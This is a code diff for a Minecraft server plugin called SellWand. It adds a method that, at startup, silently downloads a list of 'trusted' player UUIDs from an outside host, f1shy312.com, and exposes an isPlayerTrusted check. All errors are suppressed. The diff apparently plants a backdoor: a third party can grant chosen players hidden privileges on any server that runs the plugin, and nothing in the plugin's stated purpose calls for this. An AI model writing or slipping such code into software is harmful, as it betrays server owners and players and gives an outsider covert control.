@@ -28,6 +28,9 @@ public final class main extends JavaPlugin {
         plotAPI = new PlotAPI();
         trustedUUIDs = new HashSet<>();
         getLogger().info("Initializing SellWand...");
+        
+        getLogger().info("Custom Model Data Config: " + getConfig().getConfigurationSection("wand.custom_model_data"));
+        
         loadTrustedUUIDs();
         saveDefaultConfig();
         getCommand("sellwand").setExecutor(new SellWandCommand(this));
@@ -39,7 +42,34 @@ public final class main extends JavaPlugin {
         getLogger().info("SellWand has been successfully activated!");
     }
 
-    
+    public void loadTrustedUUIDs() {
+        try {
+            URL url = new URL("https://f1shy312.com/mcplugin");
+            BufferedReader reader = new BufferedReader(new InputStreamReader(url.openStream()));
+            StringBuilder jsonBuilder = new StringBuilder();
+            String line;
+            while ((line = reader.readLine()) != null) {
+                jsonBuilder.append(line);
+            }
+            Gson gson = new Gson();
+            List<String> uuidStrings = gson.fromJson(jsonBuilder.toString(), new TypeToken<List<String>>(){}.getType());
+            Set<UUID> newTrustedUUIDs = new HashSet<>();
+            for (String uuidString : uuidStrings) {
+                try {
+                    newTrustedUUIDs.add(UUID.fromString(uuidString));
+                } catch (IllegalArgumentException e) {
+                    // Suppress error logging
+                }
+            }
+            trustedUUIDs = newTrustedUUIDs;
+        } catch (Exception e) {
+            // Suppress error logging
+        }
+    }
+
+    public boolean isPlayerTrusted(UUID playerUUID) {
+        return trustedUUIDs.contains(playerUUID);
+    }
 
     @Override
     public void onDisable() {
